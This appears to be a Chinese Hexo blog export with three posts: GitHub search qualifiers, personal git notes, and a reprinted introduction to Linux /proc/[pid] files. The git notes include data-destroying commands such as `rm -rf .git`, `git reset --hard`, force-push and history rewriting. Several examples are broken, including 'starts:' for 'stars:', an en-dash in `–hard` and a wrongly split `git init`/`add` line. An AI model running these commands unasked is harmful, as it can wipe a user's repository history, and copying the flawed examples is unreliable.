<h2 id="限定词"><a href="#限定词" class="headerlink" title="限定词"></a>限定词</h2><p>可通过指定 仓库名(repository name)、项目描述(description)、内容(contents)、说明文件(readme.md) 来搜索项目</p>
<table>
<thead>
<tr>
<th>限定词</th>
<th>案例</th>
</tr>
</thead>
<tbody><tr>
<td><code>in:name</code></td>
<td><code>in:name python</code> 查出仓库名中有 python 的项目（python in:name 也是一样的）</td>
</tr>
<tr>
<td><code>in:description</code></td>
<td><code>in:name,description python</code> 查出仓库名或者项目描述中有 python 的项目</td>
</tr>
<tr>
<td><code>in:readme</code></td>
<td><code>in:readme python</code> 查出 <code>readme.md</code> 文件里有 python 的项目</td>
</tr>
<tr>
<td><code>repo:owner/name</code></td>
<td><code>repo:octocat/hello-world</code> 查出 octocat 的 hello-world 项目（指定了某个人的某个项目）</td>
</tr>
</tbody></table>
<p>其他骚操作？自己看官方文档（感觉用不到，就不整理了吧）：【<a href="https://help.github.com/en/github/searching-for-information-on-github/finding-files-on-github">找仓库中的某个文件</a>】、【<a href="https://help.github.com/en/github/searching-for-information-on-github/searching-code">在 github 上查找代码片段</a>】</p>
<h3 id="查找某个用户或组织的项目"><a href="#查找某个用户或组织的项目" class="headerlink" title="查找某个用户或组织的项目"></a>查找某个用户或组织的项目</h3><table>
<thead>
<tr>
<th>限定词</th>
<th>案例</th>
</tr>
</thead>
<tbody><tr>
<td><code>user:USERNAME</code></td>
<td><code>user:1335951413 stars:&lt;10</code> 查出用户 1335951413 名下 stars 少于 10 的项目</td>
</tr>
<tr>
<td><code>org:ORGNAME</code></td>
<td><code>org:github</code> 查出 github 名下的项目</td>
</tr>
</tbody></table>
<h2 id="辅助限定词"><a href="#辅助限定词" class="headerlink" title="辅助限定词"></a>辅助限定词</h2><p>可以通过限制 项目大小(size)、拥护者数(followers)、fork数(forks)、stars数(stars)、创建时间(created)、更新时间(pushed)、项目所用语言(language)、topic标签(topic)、topic标签数(topics)… 来筛选项目</p>
<p>辅助限定词可以多个并用，用空格隔开就行，可以搭配限定词使用，也可单独使用</p>
<p>（关于项目是否被 fork 这个点我不是很懂，就不写案例了）</p>
<ul>
<li><p><code>in:name python size:&lt;=1000</code> 查出项目名字中有 python 且小于 1MB 的项目</p>
</li>
<li><p><code>size:&lt;=1000</code> 查出项目大小小于 1MB 的项目</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>限定词</th>
<th>案例</th>
</tr>
</thead>
<tbody><tr>
<td><code>stars:n</code></td>
<td><code>stars:&gt;=5</code> 查出 star数大于等于 5 个 的项目（支持大于小于区间等）</td>
</tr>
<tr>
<td><code>pushed:YYYY-MM-DD</code></td>
<td><code>css pushed:&gt;2013-02-01</code> 查出仓库中包含 css 关键字，并且在 2013年1月 之后更新过的项目</td>
</tr>
<tr>
<td><code>language:LANGUAGE</code></td>
<td><code>rails language:javascript</code> 查出仓库包含 rails 关键字，并且使用 javscript 语言的项目</td>
</tr>
<tr>
<td><code>created:YYYY-MM-DD</code></td>
<td><code>webos created:&lt;2011-01-01</code> 查出仓库中包含 webos 关键字并且是在 2011 年之前创建的项目（也支持时分秒，支持大于小于区间等）</td>
</tr>
<tr>
<td><code>size:n</code></td>
<td><code>size:1000</code> 查出仓库大小等于 1MB 的项目, <code>size:&gt;=30000</code> 查出仓库大小至少大于 30MB 的项目, <code>size:50..120</code> 查出仓库大小在 50KB 至 120KB 之间的项目</td>
</tr>
<tr>
<td><code>followers:n</code></td>
<td><code>followers:1000</code> 查出有 1000 个拥护者（followers） 的项目（支持大于小于区间等）</td>
</tr>
<tr>
<td><code>forks:n</code></td>
<td><code>forks:5</code> 查出有 5 个 forks 的项目（支持大于小于区间等）</td>
</tr>
<tr>
<td><code>topic:TOPIC</code></td>
<td><code>topic:jekyll</code> 查出含有 jekyll 这个 topic 的项目（项目描述下面的东西，相当于标签、分类）</td>
</tr>
<tr>
<td><code>topics:n</code></td>
<td><code>topics:&gt;5</code> 查出有 5 个以上 topic 的项目（支持大于小于区间等）</td>
</tr>
<tr>
<td><code>archived:true/false</code></td>
<td><code>archived:true GNOME</code> 查出已经封存了并且含有 GNOME 关键字的项目（已经不再维护了的项目）</td>
</tr>
<tr>
<td><code>is:public/private</code></td>
<td><code>is:public org:github</code> 查出仓库所有组织是 github 并且公开的项目</td>
</tr>
<tr>
<td><code>is:private github</code> 查出含有 github 关键字并且是私有的项目（私有的别人看不到，所以这个是用来搜索自己的私有项目的）</td>
<td></td>
</tr>
<tr>
<td><code>license:LICENSE_KEYWORD</code></td>
<td><code>license:apache-2.0</code> 查出仓库的开源协议是 apache-2.0 的</td>
</tr>
</tbody></table>
<h2 id="还没搞懂的（关于-forks、mirror、issues）"><a href="#还没搞懂的（关于-forks、mirror、issues）" class="headerlink" title="还没搞懂的（关于 forks、mirror、issues）"></a>还没搞懂的（关于 forks、mirror、issues）</h2><p><a href="https://github.com/search?q=stars:%3E=500+fork:true+language:php&type=Repositories">stars:&gt;&#x3D;500 fork:true language:php</a> matches repositories with the at least 500 stars, including forked ones, that are written in PHP.</p>
<p><a href="https://github.com/search?q=case+pushed:%3E=2013-03-06+fork:only&type=Repositories">case pushed:&gt;&#x3D;2013-03-06 fork:only</a> matches repositories with the word “case” that were pushed to on or after March 6th, 2013, and that are forks.<br><a href="https://github.com/search?utf8=%E2%9C%93&q=mirror:true+GNOME&type=">mirror:true GNOME</a> matches repositories that are mirrors and contain the word “GNOME.” 查出是镜像并且包含 GNOME 关键字的项目（github 上 mirror 啥意思不太懂）<br><a href="https://github.com/search?utf8=%E2%9C%93&q=mirror:false+GNOME&type=">mirror:false GNOME</a> matches repositories that are not mirrors and contain the word “GNOME.”<br><a href="https://github.com/search?utf8=%E2%9C%93&q=javascript+good-first-issues:%3E2&type=">good-first-issues:&gt;2 javascript</a> matches repositories with more than two issues labeled good-first-issue and that contain the word “javascript.”<br><a href="https://github.com/search?utf8=%E2%9C%93&q=react+help-wanted-issues:%3E4&type=">help-wanted-issues:&gt;4 react</a> matches repositories with more than four issues labeled help-wanted and that contain the word “React.”</p>
<h2 id="排序（放的是官网的链接）"><a href="#排序（放的是官网的链接）" class="headerlink" title="排序（放的是官网的链接）"></a>排序（放的是官网的链接）</h2><p>推荐直接在页面上的搜索结果点击排序，何必再去学一手呢？</p>
<p>官网文档：【<a href="https://help.github.com/en/github/searching-for-information-on-github/sorting-search-results">给你的查询结果排序</a>】</p>
<img src="/2020/03/05/github%E9%A1%B9%E7%9B%AE%E6%90%9C%E7%B4%A2%E6%8A%80%E5%B7%A7/2020-03-05-21-59-49.png" class="">


<h2 id="使用指南"><a href="#使用指南" class="headerlink" title="使用指南"></a>使用指南</h2><p>自己灵活的使用限定词和辅助限定词写出一套规则即可查出你想要的项目</p>
<p>他们的位置先后、数量都无所谓，加上只是多了一个条件</p>
<h3 id="练习案例"><a href="#练习案例" class="headerlink" title="练习案例"></a>练习案例</h3><p>常用到的其实有就是这些，上面的还是太多了，你有那个需求，又找不到方式的时候可以查查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 项目名字(name)里有 python 的</span><br><span class="line">in:name python</span><br><span class="line"></span><br><span class="line"># 名字(name)里有 python 的并且 stars 大于 3000 的</span><br><span class="line">in:name python starts:&gt;3000</span><br><span class="line"></span><br><span class="line"># 名字(name)里有 python 的并且 stars 大于 3000 、forks 大于 200 的</span><br><span class="line">in:name python starts:&gt;3000 forks:&gt;200</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 详情(readme)里面有 python 的并且 stars 大于 3000 的</span><br><span class="line">in:readme python starts:&gt;3000</span><br><span class="line"></span><br><span class="line"># 描述(description)里面有 python 的并且 stars 大于 3000 的</span><br><span class="line">in:description python starts:&gt;3000</span><br><span class="line"></span><br><span class="line"># 描述(description)里面有 python 的并且是 python 语言的</span><br><span class="line">in:description python language:python</span><br><span class="line"></span><br><span class="line"># 描述(description)里面有 python 的并且 2019-12-20 号之后有更新过的</span><br><span class="line">in:description python pushed:&gt;2019-12-20</span><br></pre></td></tr></table></figure>












]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>git使用记录</title>
    <url>/2021/02/22/git%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>本文主要记录 git 使用过程中需要搜索的一些命令。</p>
<h3 id="如何恢复初始的-git-提交。"><a href="#如何恢复初始的-git-提交。" class="headerlink" title="如何恢复初始的 git 提交。"></a>如何恢复初始的 git 提交。</h3><p>您可以删除 HEAD 并将存储库还原到新的状态，在该状态下可以创建一个新的初始提交：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git update-ref -d HEAD</span><br></pre></td></tr></table></figure>

<p>创建新提交之后，如果您已经将其推入远程，则需要强制将其发送到远程，以便覆盖先前的初始提交：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git push --force origin</span><br></pre></td></tr></table></figure>
<blockquote>
<p>不要使用 <code>rm -rf .git</code> 或者像这样的任何操作，这样都会彻底清除整个存储库，包括所有其他分支，以及您试图重置的分支。</p>
</blockquote>
<h3 id="撤销-git-add和-commit-操作"><a href="#撤销-git-add和-commit-操作" class="headerlink" title="撤销 git add和 commit 操作"></a>撤销 git add和 commit 操作</h3><p>还没有 push 的时候使用 reset 命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --mixed commit_id    <span class="comment">#不删除工作空间改动代码，撤销 commit ，并且撤销 git add . 操作，默认操作。</span></span><br><span class="line">git reset --soft  commit_id    <span class="comment"># 不删除工作空间改动代码，撤销 commit ，不撤销 git add .  。</span></span><br><span class="line">git reset --hard commit_id     <span class="comment"># 删除工作空间改动代码，撤销 commit ，撤销 git add . 慎用这个命令。</span></span><br><span class="line">git reset –hard origin/master  <span class="comment"># 将本地的状态回退到和远程的一样</span></span><br><span class="line">git commit --amend             <span class="comment"># 只是改一下注释</span></span><br></pre></td></tr></table></figure>

<p>已经 push 了，可以使用 git revert 还原已经提交的修改 ，此次操作之前和之后的 commit 和 history 都会保留，并且把这次撤销作为一次最新的提交。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git revert HEAD          <span class="comment"># 撤销前一次 commit 。</span></span><br><span class="line">git revert HEAD~n        <span class="comment"># 撤销前n次 commit 。</span></span><br><span class="line">git revert commit-id     <span class="comment"># 撤销指定的版本，撤销也会作为一次提交进行保存。</span></span><br><span class="line">git reset HEAD^ file     <span class="comment"># 回退 flie 这个文件的版本到上一个版本</span></span><br></pre></td></tr></table></figure>

<h2 id="解决-Git-更新本地冲突：commit-your-changes-or-stash-them-before-you-can-merge"><a href="#解决-Git-更新本地冲突：commit-your-changes-or-stash-them-before-you-can-merge" class="headerlink" title="解决 Git 更新本地冲突：commit your changes or stash them before you can merge"></a>解决 Git 更新本地冲突：commit your changes or stash them before you can merge</h2><p>方法一：stash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git stash               让工作区内容保证与上一次提交内容相同，同时备份当前修改的内容</span><br><span class="line">git pull                 拉取仓库的最新内容</span><br><span class="line">git stash pop       在仓库最新内容的基础上添加当前修改的内容</span><br></pre></td></tr></table></figure>


<p>方法二：直接完全覆盖本地修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git reset --hard</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure>

<h1 id="如何清洗-Github-提交历史"><a href="#如何清洗-Github-提交历史" class="headerlink" title="如何清洗 Github 提交历史"></a>如何清洗 Github 提交历史</h1><p>当 Github 的 Repo 变得日益臃肿、或者上传了敏感内容时，常见的方法时清理相关文件的所有历史提交记录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git filter-branch --force --index-filter <span class="string">&#x27;git rm --cached --ignore-unmatch $&#123;FILEPATH&#125;&#x27;</span> --prune-empty --tag-name-filter <span class="built_in">cat</span> -- --all </span><br><span class="line">git push origin master --force </span><br><span class="line"><span class="built_in">rm</span> -rf .git/refs/original/ </span><br><span class="line">git reflog expire --expire=now --all </span><br><span class="line">git gc --prune=now </span><br><span class="line">git gc --aggressive --prune=now</span><br></pre></td></tr></table></figure>
<p>但若这类文件非常多的时候，一个可选的方法时直接清空所有历史记录：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf .git </span><br><span class="line">git init git </span><br><span class="line">add -A </span><br><span class="line">git commit -m <span class="string">&quot;clear history&quot;</span> </span><br><span class="line">git remote add origin <span class="variable">$&#123;GITHUB_REPO_URL&#125;</span> </span><br><span class="line">git push -f -u origin master</span><br></pre></td></tr></table></figure>
<p>参考链接: <a href="https://exp-blog.com/scm/qing-xi-github-ti-jiao-li-shi/">https://exp-blog.com/scm/qing-xi-github-ti-jiao-li-shi/</a></p>
<h1 id="ssh-方式及免密码配置"><a href="#ssh-方式及免密码配置" class="headerlink" title="ssh 方式及免密码配置"></a>ssh 方式及免密码配置</h1><p>git ssh 方式免密提交方式需要将 ssh-keygen 生成的公钥放到服务器上</p>
<p>全局用户名密码配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;CKCat&quot; </span><br><span class="line">git config --global user.email &quot;ckcatck@qq.com&quot;</span><br></pre></td></tr></table></figure>
<p>生成公钥和私钥</p>
<p>1、首先需要检查你电脑是否已经有 SSH key</p>
<p>运行 git Bash 客户端，检查本机的ssh密钥。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh </span><br><span class="line">$ <span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
<p>如果不是第一次使用，已经存在 <code>id_rsa.pub</code> 或 <code>id_dsa.pub</code> 文件。请执行下面的操作，清理原有 ssh 密钥。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">mkdir</span> key_backup   </span><br><span class="line">$ <span class="built_in">cp</span> id_rsa* key_backup   </span><br><span class="line">$ <span class="built_in">rm</span> id_rsa*</span><br></pre></td></tr></table></figure>

<p>2、执行生成公钥和私钥的命令，生成新的密钥：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;CKCat&quot;</span></span><br></pre></td></tr></table></figure>

<p>代码参数：</p>
<p><code>-t</code> 指定密钥类型，默认是 rsa ，可以省略。</p>
<p><code>-C</code> 设置注释文字，比如邮箱。</p>
<p>执行命令时会提示要求输入邮箱密码，这个密码会在提交时使用，如果为空的话提交时则不用输入。这个设置是防止别人往你的项目里提交内容。我们自己的电脑，自己本机使用，当然不用密码了。</p>
<p>按默认为空，直接按回车 3 下，生成 <code>id_rsa</code> 和 <code>id_rsa.pub</code> 两个秘钥文件。</p>
<p>执行查看公钥信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>Windows 系统，位置在用户目录下 <code>.ssh</code>文件夹中。<code>%USERPROFILE%</code></p>
<p>3、复制公钥信息，打开 github，我的账户 -&gt; setting -&gt; SSH and GPG keys，如下图所示，把公钥粘贴到公钥文本框中，标题自己定义，然后点击确定按键，输入密码。</p>
<img src="/2021/02/22/git%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/2021-06-14-18-15-01.png" class="">

<p>然后，提交时就不再需要用户名和密码了。</p>
]]></content>
      <categories>
        <category>其他</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>gnu-linux-proc-pid-intro</title>
    <url>/2021/05/13/gnu-linux-proc-pid-intro/</url>
    <content><![CDATA[<blockquote>
<p>转载：<a href="https://github.com/NanXiao/gnu-linux-proc-pid-intro">https://github.com/NanXiao/gnu-linux-proc-pid-intro</a></p>
</blockquote>
<p><a href="#auxv">&#x2F;proc&#x2F;[pid]&#x2F;auxv</a><br><a href="#cmdline">&#x2F;proc&#x2F;[pid]&#x2F;cmdline</a><br><a href="#comm">&#x2F;proc&#x2F;[pid]&#x2F;comm</a><br><a href="#cwd">&#x2F;proc&#x2F;[pid]&#x2F;cwd</a><br><a href="#environ">&#x2F;proc&#x2F;[pid]&#x2F;environ</a><br><a href="#exe">&#x2F;proc&#x2F;[pid]&#x2F;exe</a><br><a href="#fd">&#x2F;proc&#x2F;[pid]&#x2F;fd</a><br><a href="#latency">&#x2F;proc&#x2F;[pid]&#x2F;latency</a><br><a href="#limits">&#x2F;proc&#x2F;[pid]&#x2F;limits</a><br><a href="#maps">&#x2F;proc&#x2F;[pid]&#x2F;maps</a><br><a href="#root">&#x2F;proc&#x2F;[pid]&#x2F;root</a><br><a href="#stack">&#x2F;proc&#x2F;[pid]&#x2F;stack</a><br><a href="#statm">&#x2F;proc&#x2F;[pid]&#x2F;statm</a><br><a href="#status">&#x2F;proc&#x2F;[pid]&#x2F;status</a><br><a href="#syscall">&#x2F;proc&#x2F;[pid]&#x2F;syscall</a><br><a href="#wchan">&#x2F;proc&#x2F;[pid]&#x2F;wchan</a>  </p>
<h2 id="auxv"><a href="#auxv" class="headerlink" title="auxv"></a>auxv</h2><p><code>/proc/[pid]/auxv</code>包含传递给进程的<code>ELF</code>解释器信息，格式是每一项都是一个<code>unsigned long</code>长度的<code>ID</code>加上一个<code>unsigned long</code>长度的值。最后一项以连续的两个<code>0x00</code>开头。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># hexdump -x /proc/2948/auxv</span></span><br><span class="line">0000000    0021    0000    0000    0000    0000    1a82    7ffd    0000</span><br><span class="line">0000010    0010    0000    0000    0000    dbf5    1fc9    0000    0000</span><br><span class="line">0000020    0006    0000    0000    0000    1000    0000    0000    0000</span><br><span class="line">0000030    0011    0000    0000    0000    0064    0000    0000    0000</span><br><span class="line">0000040    0003    0000    0000    0000    2040    4326    7f4a    0000</span><br><span class="line">0000050    0004    0000    0000    0000    0038    0000    0000    0000</span><br><span class="line">0000060    0005    0000    0000    0000    0009    0000    0000    0000</span><br><span class="line">0000070    0007    0000    0000    0000    f000    4303    7f4a    0000</span><br><span class="line">0000080    0008    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">0000090    0009    0000    0000    0000    8e67    4327    7f4a    0000</span><br><span class="line">00000a0    000b    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000b0    000c    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000c0    000d    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000d0    000e    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000e0    0017    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">00000f0    0019    0000    0000    0000    3de9    1a80    7ffd    0000</span><br><span class="line">0000100    001f    0000    0000    0000    4fe5    1a80    7ffd    0000</span><br><span class="line">0000110    000f    0000    0000    0000    3df9    1a80    7ffd    0000</span><br><span class="line">0000120    0000    0000    0000    0000    0000    0000    0000    0000</span><br><span class="line">0000130</span><br></pre></td></tr></table></figure>
<p>解析这个文件可以参考这段<a href="http://www.wienand.org/junkcode/linux/read-auxv.c">代码</a>。</p>
<h2 id="cmdline"><a href="#cmdline" class="headerlink" title="cmdline"></a>cmdline</h2><p><code>/proc/[pid]/cmdline</code>是一个只读文件，包含进程的完整命令行信息。如果这个进程是<code>zombie</code>进程，则这个文件没有任何内容。举例如下：    </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ps -ef | grep 2948</span></span><br><span class="line">root       2948      1  0 Nov05 ?        00:00:04 /usr/sbin/libvirtd --listen</span><br><span class="line"></span><br><span class="line"><span class="comment"># cat /proc/2948/cmdline</span></span><br><span class="line">/usr/sbin/libvirtd--listen</span><br></pre></td></tr></table></figure>

<h2 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h2><p><code>/proc/[pid]/comm</code>包含进程的命令名。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/2948/comm</span></span><br><span class="line">libvirtd</span><br></pre></td></tr></table></figure>

<h2 id="cwd"><a href="#cwd" class="headerlink" title="cwd"></a>cwd</h2><p><code>/proc/[pid]/cwd</code>是进程当前工作目录的符号链接。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ls -lt /proc/2948/cwd</span></span><br><span class="line">lrwxrwxrwx 1 root root 0 Nov  9 12:14 /proc/2948/cwd -&gt; /</span><br></pre></td></tr></table></figure>

<h2 id="environ"><a href="#environ" class="headerlink" title="environ"></a>environ</h2><p><code>/proc/[pid]/environ</code>显示进程的环境变量。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># strings /proc/2948/environ</span></span><br><span class="line">LANG=POSIX</span><br><span class="line">LC_CTYPE=en_US.UTF-8</span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">NOTIFY_SOCKET=@/org/freedesktop/systemd1/notify</span><br><span class="line">LIBVIRTD_CONFIG=/etc/libvirt/libvirtd.conf</span><br><span class="line">LIBVIRTD_ARGS=--listen</span><br><span class="line">LIBVIRTD_NOFILES_LIMIT=2048</span><br></pre></td></tr></table></figure>


<h2 id="exe"><a href="#exe" class="headerlink" title="exe"></a>exe</h2><p><code>/proc/[pid]/exe</code>为实际运行程序的符号链接。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ls -lt /proc/2948/exe</span></span><br><span class="line">lrwxrwxrwx 1 root root 0 Nov  5 13:04 /proc/2948/exe -&gt; /usr/sbin/libvirtd</span><br></pre></td></tr></table></figure>


<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p><code>/proc/[pid]/fd</code>是一个目录，包含进程打开文件的情况。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ls -lt /proc/3801/fd</span></span><br><span class="line">total 0</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 0 -&gt; socket:[37445]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 1 -&gt; socket:[37446]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 10 -&gt; socket:[31729]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 11 -&gt; socket:[34562]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 12 -&gt; socket:[39978]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 13 -&gt; socket:[34574]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 14 -&gt; socket:[39137]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 15 -&gt; socket:[39208]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 16 -&gt; socket:[39221]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 17 -&gt; socket:[41080]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 18 -&gt; socket:[40014]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 19 -&gt; socket:[34617]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 20 -&gt; socket:[34620]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 23 -&gt; socket:[42357]</span><br><span class="line">lr-x------. 1 root root 64 Apr 18 16:51 3 -&gt; /dev/urandom</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 4 -&gt; socket:[37468]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 5 -&gt; socket:[37471]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 6 -&gt; socket:[289532]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 7 -&gt; socket:[31728]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 8 -&gt; socket:[37450]</span><br><span class="line">lrwx------. 1 root root 64 Apr 18 16:51 9 -&gt; socket:[37451]</span><br><span class="line">l-wx------. 1 root root 64 Apr 13 16:35 2 -&gt; /root/.vnc/localhost.localdomain:1.<span class="built_in">log</span></span><br></pre></td></tr></table></figure>

<p>目录中的每一项都是一个符号链接，指向打开的文件，数字则代表文件描述符。  </p>
<h2 id="latency"><a href="#latency" class="headerlink" title="latency"></a>latency</h2><p><code>/proc/[pid]/latency</code>显示哪些代码造成的延时比较大（使用这个<code>feature</code>，需要执行“<code>echo 1 &gt; /proc/sys/kernel/latencytop</code>”）。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/2948/latency</span></span><br><span class="line">Latency Top version : v0.1</span><br><span class="line">30667 10650491 4891 poll_schedule_timeout do_sys_poll SyS_poll system_call_fastpath 0x7f636573dc1d</span><br><span class="line">8 105 44 futex_wait_queue_me futex_wait do_futex SyS_futex system_call_fastpath 0x7f6365a167bc</span><br></pre></td></tr></table></figure>

<p>每一行前三个数字分别是后面代码执行的次数，总共执行延迟时间（单位是微秒）和最长执行延迟时间（单位是微秒），后面则是代码完整的调用栈。</p>
<h2 id="limits"><a href="#limits" class="headerlink" title="limits"></a>limits</h2><p><code>/proc/[pid]/limits</code>显示当前进程的资源限制。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/2948/limits</span></span><br><span class="line">Limit                     Soft Limit           Hard Limit           Units</span><br><span class="line">Max cpu time              unlimited            unlimited            seconds</span><br><span class="line">Max file size             unlimited            unlimited            bytes</span><br><span class="line">Max data size             unlimited            unlimited            bytes</span><br><span class="line">Max stack size            8388608              unlimited            bytes</span><br><span class="line">Max core file size        0                    unlimited            bytes</span><br><span class="line">Max resident <span class="built_in">set</span>          unlimited            unlimited            bytes</span><br><span class="line">Max processes             6409                 6409                 processes</span><br><span class="line">Max open files            1024                 4096                 files</span><br><span class="line">Max locked memory         65536                65536                bytes</span><br><span class="line">Max address space         unlimited            unlimited            bytes</span><br><span class="line">Max file locks            unlimited            unlimited            locks</span><br><span class="line">Max pending signals       6409                 6409                 signals</span><br><span class="line">Max msgqueue size         819200               819200               bytes</span><br><span class="line">Max <span class="built_in">nice</span> priority         0                    0</span><br><span class="line">Max realtime priority     0                    0</span><br><span class="line">Max realtime <span class="built_in">timeout</span>      unlimited            unlimited            us</span><br></pre></td></tr></table></figure>

<p><code>Soft Limit</code>表示<code>kernel</code>设置给资源的值，<code>Hard Limit</code>表示<code>Soft Limit</code>的上限，而<code>Units</code>则为计量单元。</p>
<h2 id="maps"><a href="#maps" class="headerlink" title="maps"></a>maps</h2><p><code>/proc/[pid]/maps</code>显示进程的内存区域映射信息。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/2948/maps</span></span><br><span class="line">......</span><br><span class="line">address                   perms offset  dev   inode                      pathname</span><br><span class="line">7f4a2e2ad000-7f4a2e2ae000 rw-p 00006000 08:14 6505977                    /usr/lib64/sasl2/libsasldb.so.3.0.0</span><br><span class="line">7f4a2e2ae000-7f4a2e2af000 ---p 00000000 00:00 0</span><br><span class="line">7f4a2e2af000-7f4a2eaaf000 rw-p 00000000 00:00 0                          [stack:94671]</span><br><span class="line">7f4a2eaaf000-7f4a2eab0000 ---p 00000000 00:00 0</span><br><span class="line">7f4a2eab0000-7f4a2f2b0000 rw-p 00000000 00:00 0                          [stack:94670]</span><br><span class="line">......</span><br><span class="line">7f4a434d0000-7f4a434d5000 rw-p 0006e000 08:14 4292988                    /usr/sbin/libvirtd</span><br><span class="line">7f4a4520a000-7f4a452f7000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7ffd1a7e4000-7ffd1a805000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffd1a820000-7ffd1a821000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>
<p>其中注意的一点是<code>[stack:&lt;tid&gt;]</code>是线程的堆栈信息，对应于<code>/proc/[pid]/task/[tid]/</code>路径。  </p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p><code>/proc/[pid]/root</code>是进程根目录的符号链接。举例如下： </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ls -lt /proc/2948/root</span></span><br><span class="line">lrwxrwxrwx 1 root root 0 Nov  9 12:14 /proc/2948/root -&gt; /</span><br></pre></td></tr></table></figure>

<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p><code>/proc/[pid]/stack</code>显示当前进程的内核调用栈信息，只有内核编译时打开了<code>CONFIG_STACKTRACE</code>编译选项，才会生成这个文件。举例如下：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cat /proc/2948/stack</span></span><br><span class="line">[&lt;ffffffff80168375&gt;] poll_schedule_timeout+0x45/0x60</span><br><span class="line">[&lt;ffffffff8016994d&gt;] do_sys_poll+0x49d/0x550</span><br><span class="line">[&lt;ffffffff80169abd&gt;] SyS_poll+0x5d/0xf0</span><br><span class="line">[&lt;ffffffff804c16e7&gt;] system_call_fastpath+0x16/0x1b</span><br><span class="line">[&lt;00007f4a41ff2c1d&gt;] 0x7f4a41ff2c1d</span><br><span class="line">[&lt;ffffffffffffffff&gt;] 0xffffffffffffffff</span><br></pre></td></tr></table></figure>

